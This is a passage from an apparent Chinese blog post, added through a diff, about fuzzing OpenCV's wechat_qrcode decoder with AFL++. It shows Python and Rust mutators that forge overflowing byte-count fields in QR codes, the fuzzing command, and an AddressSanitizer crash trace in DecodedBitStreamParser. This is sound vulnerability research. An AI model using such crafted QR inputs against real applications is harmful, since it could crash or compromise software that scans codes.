+        <span class="token builtin">buffer</span><span class="token punctuation">.</span>put<span class="token punctuation">(</span>data_len<span class="token punctuation">,</span> length_in_bits<span class="token punctuation">(</span>data<span class="token punctuation">.</span>mode<span class="token punctuation">,</span> version<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        data<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># Calculate the maximum number of bits for the given version.</span>
+    rs_blocks <span class="token operator">=</span> base<span class="token punctuation">.</span>rs_blocks<span class="token punctuation">(</span>version<span class="token punctuation">,</span> error_correction<span class="token punctuation">)</span>
+    bit_limit <span class="token operator">=</span> <span class="token builtin">sum</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>data_count <span class="token operator">*</span> <span class="token number">8</span> <span class="token keyword">for</span> block <span class="token keyword">in</span> rs_blocks<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span> <span class="token operator">></span> bit_limit<span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> exceptions<span class="token punctuation">.</span>DataOverflowError<span class="token punctuation">(</span>
+            <span class="token string">"Code length overflow. Data size (%s) > size available (%s)"</span>
+            <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span><span class="token punctuation">,</span> bit_limit<span class="token punctuation">)</span>
+        <span class="token punctuation">)</span>
+
+    <span class="token comment"># Terminate the bits (add up to four 0s).</span>
+    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">min</span><span class="token punctuation">(</span>bit_limit <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token builtin">buffer</span><span class="token punctuation">.</span>put_bit<span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># Delimit the string into 8-bit words, padding with 0s if necessary.</span>
+    delimit <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span>
+    <span class="token keyword">if</span> delimit<span class="token punctuation">:</span>
+        <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">-</span> delimit<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token builtin">buffer</span><span class="token punctuation">.</span>put_bit<span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># Add special alternating padding bitstrings until buffer is full.</span>
+    bytes_to_fill <span class="token operator">=</span> <span class="token punctuation">(</span>bit_limit <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">8</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>bytes_to_fill<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+            <span class="token builtin">buffer</span><span class="token punctuation">.</span>put<span class="token punctuation">(</span>PAD0<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token builtin">buffer</span><span class="token punctuation">.</span>put<span class="token punctuation">(</span>PAD1<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> create_bytes<span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">,</span> rs_blocks<span class="token punctuation">)</span>
+
+qrcode<span class="token punctuation">.</span>util<span class="token punctuation">.</span>create_data <span class="token operator">=</span> hack_create_data
+
+<span class="token keyword">def</span> <span class="token function">init</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""
+    Called once when AFLFuzz starts up. Used to seed our RNG.
+
+    @type seed: int
+    @param seed: A 32-bit random value
+    """</span>
+    random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">233</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">fuzz</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> add_buf<span class="token punctuation">,</span> max_size<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""
+    Called per fuzzing iteration.
+
+    @type buf: bytearray
+    @param buf: The buffer that should be mutated.
+
+    @type add_buf: bytearray
+    @param add_buf: A second buffer that can be used as mutation source.
+
+    @type max_size: int
+    @param max_size: Maximum size of the mutated output. The mutation must not
+        produce data larger than max_size.
+
+    @rtype: bytearray
+    @return: A new bytearray containing the mutated data
+    """</span>
+    
+    qr <span class="token operator">=</span> QRCode<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> qrcode<span class="token punctuation">.</span>constants<span class="token punctuation">.</span>ERROR_CORRECT_L<span class="token punctuation">,</span> mask_pattern<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># 1-L mode data max ot 16</span>
+    data <span class="token operator">=</span> <span class="token string">b"deadbeef"</span> <span class="token operator">*</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>
+    data2 <span class="token operator">=</span> <span class="token string">b"deadbeef"</span> <span class="token operator">*</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>
+    qr<span class="token punctuation">.</span>add_data<span class="token punctuation">(</span>QRData<span class="token punctuation">(</span>data<span class="token punctuation">,</span> MODE_8BIT_BYTE<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    qr<span class="token punctuation">.</span>add_data<span class="token punctuation">(</span>QRData<span class="token punctuation">(</span>data2<span class="token punctuation">,</span> MODE_8BIT_BYTE<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    img <span class="token operator">=</span> qr<span class="token punctuation">.</span>make_image<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    img_bytes <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    img<span class="token punctuation">.</span>save<span class="token punctuation">(</span>img_bytes<span class="token punctuation">,</span> <span class="token string">"png"</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>img_bytes<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<br>
+<p>这里我们选择 1-L mode ，这个模式最长codeword是19，其中mode和count占据3字节，所以我们能操控的data长度是16，这里使用n个重复的b&quot;deadbeef&quot;，最大24，保证能有溢出效果。</p>
+<p><code>qrcode.make_image</code> 总会调用<code>qrcode.util.create_data</code>，我们这里重写这个方法，唯一的变化就是在向<code>buffer</code>写<code>data_list</code>时，控制count字段，使用一个随机的长度 <code>data_len = hack_data_len(data)</code> ，这里<code>hack_data_len</code>控制在[0,17] 也是刚好能超过16溢出.</p>
+<br>
+<p>fuzzing cmd:</p>
+<p><code>AFL_CUSTOM_MUTATOR_ONLY=1 PYTHONPATH=$PWD AFL_PYTHON_MODULE=qrcode_mutator afl-fuzz -i corpus/ -o output_w_mutator -t +9000 -- ./opencv_test_wechat_qrcode_persist</code></p>
+<br>
+<p><img src="/images/wechatqrcodefuzz/Untitled%201.png" alt="Untitled" / srcset="/images/LoadingImage.gif" data-src="/images/wechatqrcodefuzz/Untitled%201.png" class="lozad post-image"></p>
+<br>
+<p>半个小时就出现了一个crash，第一个crash就顺利命中了，</p>
+<br>
+<p><img src="/images/wechatqrcodefuzz/id-000000.png" alt="id-000000.png" / srcset="/images/LoadingImage.gif" data-src="/images/wechatqrcodefuzz/id-000000.png" class="lozad post-image"></p>
+<br>
+<p><img src="/images/wechatqrcodefuzz/Untitled%202.png" alt="Untitled" / srcset="/images/LoadingImage.gif" data-src="/images/wechatqrcodefuzz/Untitled%202.png" class="lozad post-image"></p>
+<br>
+<p>qrcode 解析 from <a target="_blank" rel="noopener" href="https://merri.cx/qrazybox/">QRazyBox - QR Code Analysis and Recovery Toolkit (merri.cx)</a></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span>AFL<span class="token operator">+</span><span class="token operator">+</span> ca32c4c1ac87<span class="token punctuation">]</span> <span class="token operator">/</span>src<span class="token operator">/</span>build<span class="token operator">/</span>fuzzing <span class="token comment"># ./opencv_test_wechat_qrcode output_w_mutator/id-000000.png</span>
+AddressSanitizer<span class="token punctuation">:</span>DEADLYSIGNAL
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+<span class="token operator">==</span><span class="token number">204888</span><span class="token operator">==</span>ERROR<span class="token punctuation">:</span> AddressSanitizer<span class="token punctuation">:</span> SEGV on unknown address <span class="token number">0x000000000005</span> <span class="token punctuation">(</span>pc <span class="token number">0x7f3e12b0fa60</span> bp <span class="token number">0x7ffc402fcff0</span> sp <span class="token number">0x7ffc402fc7a8</span> T0<span class="token punctuation">)</span>
+<span class="token operator">==</span><span class="token number">204888</span><span class="token operator">==</span>The signal <span class="token keyword">is</span> caused by a READ memory access<span class="token punctuation">.</span>
+<span class="token operator">==</span><span class="token number">204888</span><span class="token operator">==</span>Hint<span class="token punctuation">:</span> address points to the zero page<span class="token punctuation">.</span>
+    <span class="token comment">#0 0x7f3e12b0fa60  (/lib/x86_64-linux-gnu/libc.so.6+0xc4a60) (BuildId: 69389d485a9793dbe873f0ea2c93e02efaa9aa3d)</span>
+    <span class="token comment">#1 0x55a00ce4a497 in __interceptor_memcpy (/src/build/fuzzing/opencv_test_wechat_qrcode+0x3c6497) (BuildId: 96f5964f2bbc86cfa7923e5f345d712478fc66a8)</span>
+    <span class="token comment">#2 0x7f3e12de0892 in std::__cxx11::basic_string&lt;char, std::char_traits&lt;char>, std::allocator&lt;char> >::_M_append(char const*, unsigned long) (/lib/x86_64-linux-gnu/libstdc++.so.6+0x14d892) (BuildId: f57e02bfadacc0c923c82457d5e18e1830b5faea)</span>
+    <span class="token comment">#3 0x55a00d343a9e in std::__cxx11::basic_string&lt;char, std::char_traits&lt;char>, std::allocator&lt;char> >::append(char const*, unsigned long) /usr/lib/gcc/x86_64-linux-gnu/11/../../../../include/c++/11/bits/basic_string.h:1246:9</span>
+    <span class="token comment">#4 0x55a00d343a9e in zxing::qrcode::DecodedBitStreamParser::append(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char>, std::allocator&lt;char> >&amp;, char const*, unsigned long, zxing::ErrorHandler&amp;) /src/opencv_contrib/modules/wechat_qrcode/src/zxing/qrcode/decoder/decoded_bit_stream_parser.cpp:108:12</span>
+    <span class="token comment">#5 0x55a00d343a9e in zxing::qrcode::DecodedBitStreamParser::decodeByteSegment(zxing::Ref&lt;zxing::BitSource>, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char>, std::allocator&lt;char> >&amp;, int, zxing::common::CharacterSetECI*, zxing::ArrayRef&lt;zxing::ArrayRef&lt;char> >&amp;, zxing::ErrorHandler&amp;) /src/opencv_contrib/modules/wechat_qrcode/src/zxing/qrcode/decoder/decoded_bit_stream_parser.cpp:227:5</span>
+    <span class="token comment">#6 0x55a00d348d03 in zxing::qrcode::DecodedBitStreamParser::decode(zxing::ArrayRef&lt;char>, zxing::qrcode::Version*, zxing::qrcode::ErrorCorrectionLevel const&amp;, zxing::ErrorHandler&amp;, int) /src/opencv_contrib/modules/wechat_qrcode/src/zxing/qrcode/decoder/decoded_bit_stream_parser.cpp:463:25</span>
+    <span class="token comment">#7 0x55a00d2509be in zxing::qrcode::Decoder::decode(zxing::Ref&lt;zxing::BitMatrix>, bool, zxing::ErrorHandler&amp;) /src/opencv_contrib/modules/wechat_qrcode/src/zxing/qrcode/decoder/decoder.cpp:158:20</span>
+    <span class="token comment">#8 0x55a00d24d50b in zxing::qrcode::Decoder::decode(zxing::Ref&lt;zxing::BitMatrix>, zxing::ErrorHandler&amp;) /src/opencv_contrib/modules/wechat_qrcode/src/zxing/qrcode/decoder/decoder.cpp:47:30</span>
+    <span class="token comment">#9 0x55a00d1d7259 in zxing::qrcode::QRCodeReader::decodeMore(zxing::Ref&lt;zxing::BinaryBitmap>, zxing::Ref&lt;zxing::BitMatrix>, zxing::DecodeHints, zxing::ErrorHandler&amp;) /src/opencv_contrib/modules/wechat_qrcode/src/zxing/qrcode/qrcode_reader.cpp:120:30</span>
+    <span class="token comment">#10 0x55a00d1d3936 in zxing::qrcode::QRCodeReader::decode(zxing::Ref&lt;zxing::BinaryBitmap>, zxing::DecodeHints) /src/opencv_contrib/modules/wechat_qrcode/src/zxing/qrcode/qrcode_reader.cpp:46:31</span>
+    <span class="token comment">#11 0x55a00d1fab94 in cv::wechat_qrcode::DecoderMgr::Decode(zxing::Ref&lt;zxing::BinaryBitmap>, zxing::DecodeHints) /src/opencv_contrib/modules/wechat_qrcode/src/decodermgr.cpp:89:21</span>
+    <span class="token comment">#12 0x55a00d1fab94 in cv::wechat_qrcode::DecoderMgr::TryDecode(zxing::Ref&lt;zxing::LuminanceSource>, std::vector&lt;zxing::Ref&lt;zxing::Result>, std::allocator&lt;zxing::Ref&lt;zxing::Result> > >&amp;) /src/opencv_contrib/modules/wechat_qrcode/src/decodermgr.cpp:78:15</span>
+    <span class="token comment">#13 0x55a00d1f465f in cv::wechat_qrcode::DecoderMgr::decodeImage(cv::Mat, bool, std::vector&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char>, std::allocator&lt;char> >, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char>, std::allocator&lt;char> > > >&amp;, std::vector&lt;std::vector&lt;cv::Point_&lt;float>, std::allocator&lt;cv::Point_&lt;float> > >, std::allocator&lt;std::vector&lt;cv::Point_&lt;float>, std::allocator&lt;cv::Point_&lt;float> > > > >&amp;) /src/opencv_contrib/modules/wechat_qrcode/src/decodermgr.cpp:46:19</span>
+    <span class="token comment">#14 0x55a00d1c87e8 in cv::wechat_qrcode::WeChatQRCode::Impl::decode[abi:cxx11](cv::Mat const&amp;, std::vector&lt;cv::Mat, std::allocator&lt;cv::Mat> >&amp;, std::vector&lt;cv::Mat, std::allocator&lt;cv::Mat> >&amp;) /src/opencv_contrib/modules/wechat_qrcode/src/wechat_qrcode.cpp:148:34</span>
+    <span class="token comment">#15 0x55a00d1c674a in cv::wechat_qrcode::WeChatQRCode::detectAndDecode[abi:cxx11](cv::_InputArray const&amp;, cv::_OutputArray const&amp;) /src/opencv_contrib/modules/wechat_qrcode/src/wechat_qrcode.cpp:100:19</span>
+    <span class="token comment">#16 0x55a00cee699f in main /src/opencv_contrib/modules/wechat_qrcode/test/test_main.cpp:27:40</span>
+    <span class="token comment">#17 0x7f3e12a74d8f  (/lib/x86_64-linux-gnu/libc.so.6+0x29d8f) (BuildId: 69389d485a9793dbe873f0ea2c93e02efaa9aa3d)</span>
+    <span class="token comment">#18 0x7f3e12a74e3f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x29e3f) (BuildId: 69389d485a9793dbe873f0ea2c93e02efaa9aa3d)</span>
+    <span class="token comment">#19 0x55a00ce31d04 in _start (/src/build/fuzzing/opencv_test_wechat_qrcode+0x3add04) (BuildId: 96f5964f2bbc86cfa7923e5f345d712478fc66a8)</span>
+
+AddressSanitizer can <span class="token keyword">not</span> provide additional info<span class="token punctuation">.</span>
+SUMMARY<span class="token punctuation">:</span> AddressSanitizer<span class="token punctuation">:</span> SEGV <span class="token punctuation">(</span><span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token punctuation">.</span>so<span class="token punctuation">.</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">0xc4a60</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>BuildId<span class="token punctuation">:</span> <span class="token number">69389d485a9793dbe873f0ea2c93e02efaa9aa3d</span><span class="token punctuation">)</span> 
+<span class="token operator">==</span><span class="token number">204888</span><span class="token operator">==</span>ABORTING<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<br>
+<h2 id="custom-mutatorrust"><a class="markdownIt-Anchor" href="#custom-mutatorrust"></a> custom mutator(Rust)</h2>
+<p>python 太慢，搞个rust版本，afl++有官方example可以参考：</p>
+<p>image = &quot;0.22.0”</p>
+<p>qrcode git v0.11.2</p>
+<p>rand = &quot;0.8.4”</p>
+<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#![cfg(unix)]</span>
+<span class="token attribute attr-name">#![allow(unused_variables)]</span>
+<span class="token keyword">use</span> <span class="token namespace">custom_mutator<span class="token punctuation">::</span></span><span class="token punctuation">&#123;</span>export_mutator<span class="token punctuation">,</span> <span class="token class-name">CustomMutator</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token namespace">image<span class="token punctuation">::</span></span><span class="token class-name">Luma</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token namespace">qrcode<span class="token punctuation">::</span></span><span class="token class-name">QrCode</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token namespace">qrcode<span class="token punctuation">::</span>bits<span class="token punctuation">::</span></span><span class="token class-name">Bits</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token namespace">qrcode<span class="token punctuation">::</span>types<span class="token punctuation">::</span></span><span class="token punctuation">&#123;</span><span class="token class-name">EcLevel</span><span class="token punctuation">,</span> <span class="token class-name">Version</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+<span class="token keyword">use</span> <span class="token namespace">rand<span class="token punctuation">::</span></span><span class="token class-name">Rng</span><span class="token punctuation">;</span>
+
+<span class="token keyword">struct</span> <span class="token type-definition class-name">ExampleMutator</span> <span class="token punctuation">&#123;</span>
+    own_image_buffer<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">u8</span><span class="token operator">></span><span class="token punctuation">,</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">impl</span> <span class="token class-name">CustomMutator</span> <span class="token keyword">for</span> <span class="token class-name">ExampleMutator</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">type</span> <span class="token class-name">Error</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">fn</span> <span class="token function-definition function">init</span><span class="token punctuation">(</span>seed<span class="token punctuation">:</span> <span class="token keyword">u32</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token keyword">Self</span><span class="token punctuation">,</span> <span class="token keyword">Self</span><span class="token punctuation">::</span><span class="token class-name">Error</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
+        <span class="token comment">// print a message to console</span>
+        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"ExampleMutator init() called with seed &#123;&#125;"</span><span class="token punctuation">,</span> seed<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token keyword">Self</span> <span class="token punctuation">&#123;</span>
+            own_image_buffer<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">fn</span> <span class="token function-definition function">fuzz</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'b</span><span class="token punctuation">,</span> <span class="token lifetime-annotation symbol">'s</span><span class="token punctuation">:</span> <span class="token lifetime-annotation symbol">'b</span><span class="token operator">></span><span class="token punctuation">(</span>
+        <span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'s</span> <span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span>
+        buffer<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'b</span> <span class="token keyword">mut</span> <span class="token punctuation">[</span><span class="token keyword">u8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        add_buff<span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token keyword">u8</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">,</span>
+        max_size<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span>
+    <span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'b</span> <span class="token punctuation">[</span><span class="token keyword">u8</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token keyword">Self</span><span class="token punctuation">::</span><span class="token class-name">Error</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
+        
+        <span class="token keyword">let</span> bytes_data<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token keyword">u8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">b"deadbeef"</span><span class="token punctuation">;</span>
+        <span class="token keyword">let</span> bytes_data1 <span class="token operator">=</span> bytes_data<span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token namespace">rand<span class="token punctuation">::</span></span><span class="token function">thread_rng</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">gen_range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">..=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">let</span> bytes_data2 <span class="token operator">=</span> bytes_data<span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token namespace">rand<span class="token punctuation">::</span></span><span class="token function">thread_rng</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">gen_range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">..=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">let</span> <span class="token keyword">mut</span> bits<span class="token punctuation">:</span> <span class="token class-name">Bits</span> <span class="token operator">=</span> <span class="token class-name">Bits</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">Version</span><span class="token punctuation">::</span><span class="token class-name">Normal</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        bits<span class="token punctuation">.</span><span class="token function">push_byte_data</span><span class="token punctuation">(</span>bytes_data1<span class="token punctuation">.</span><span class="token function">as_slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        bits<span class="token punctuation">.</span><span class="token function">push_byte_data</span><span class="token punctuation">(</span>bytes_data2<span class="token punctuation">.</span><span class="token function">as_slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        bits<span class="token punctuation">.</span><span class="token function">push_terminator</span><span class="token punctuation">(</span><span class="token class-name">EcLevel</span><span class="token punctuation">::</span><span class="token class-name">L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">let</span> qrcode <span class="token operator">=</span> <span class="token class-name">QrCode</span><span class="token punctuation">::</span><span class="token function">with_bits</span><span class="token punctuation">(</span>bits<span class="token punctuation">,</span> <span class="token class-name">EcLevel</span><span class="token punctuation">::</span><span class="token class-name">L</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">let</span> image <span class="token operator">=</span> qrcode<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">::</span><span class="token operator">&lt;</span><span class="token class-name">Luma</span><span class="token operator">&lt;</span><span class="token keyword">u8</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">self</span><span class="token punctuation">.</span>own_image_buffer <span class="token operator">=</span> image<span class="token punctuation">.</span><span class="token function">into_raw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        
+        <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>own_image_buffer<span class="token punctuation">.</span><span class="token function">as_slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token macro property">export_mutator!</span><span class="token punctuation">(</span><span class="token class-name">ExampleMutator</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<br>
+<p>这里需要魔改rust-qrcode这个库，关键是<code>bits.rs</code>文件中的一个函数：</p>
+<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">rand<span class="token punctuation">::</span></span><span class="token class-name">Rng</span><span class="token punctuation">;</span>
+
+<span class="token keyword">impl</span> <span class="token class-name">Bits</span> <span class="token punctuation">&#123;</span>
+    <span class="token comment">/// Encodes 8-bit byte data to the bits.</span>
+    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">push_byte_data</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> data<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token keyword">u8</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">QrResult</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
+        <span class="token comment">// use global RNG generate a random number between 0 and 18</span>
+        <span class="token keyword">let</span> data_len <span class="token operator">=</span> <span class="token namespace">rand<span class="token punctuation">::</span></span><span class="token function">thread_rng</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">gen_range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">..=</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
